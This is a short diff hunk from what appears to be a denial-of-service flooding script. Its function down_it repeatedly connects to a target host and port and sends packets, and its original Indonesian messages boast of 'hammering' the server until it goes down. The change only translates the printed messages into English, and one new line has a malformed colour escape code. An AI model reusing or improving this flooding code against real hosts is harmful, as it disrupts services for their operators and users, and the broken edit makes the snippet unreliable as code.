@@ -54,13 +54,13 @@ def down_it(item):
             s.connect((host, int(port)))
             if s.sendto(packet, (host, int(port))):
                 s.shutdown(1)
-                print("\033[92m", time.ctime(time.time()), "\033[0m \033[94m <--packet terkirim! hammering--> \033[0m")
+                print("\033[92m", time.ctime(time.time()), "\033[0m \033[94m <--packet send--> \033[0m")
             else:
                 s.shutdown(1)
                 print("\033[91mshut<->down\033[0m")
             time.sleep(.1)
     except socket.error as e:
-        print("\033[91mno koneksi! server sedang down\033[0m")
+        print("\033[91 server down\033[0m")
         # print("\033[91m",e,"\033[0m")
         time.sleep(.1)
 
